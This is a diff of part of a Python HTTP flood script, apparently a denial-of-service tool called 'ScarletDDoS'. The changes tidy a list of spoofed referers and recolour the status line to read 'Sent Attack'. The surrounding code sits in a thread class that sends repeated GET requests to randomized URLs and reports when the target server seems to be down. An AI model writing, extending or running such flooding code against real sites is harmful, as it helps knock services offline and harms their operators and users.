@@ -17,10 +17,8 @@ count = 0
 headers = []
 referer = [
     "https://google.it/",
-     "https://google.com/",
-    
-  
-]
+    "https://google.com/",
+    ]
 
 
 def useragent():
@@ -54,7 +52,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 count += 1
-                print ("{0} ScarletDDoS Sent".format(count))
+                print ("{0}\033[33mSent\033[35mAttack".format(count))
             except requests.exceptions.ConnectionError:
                 print ("[Server might be down!]")
                 pass
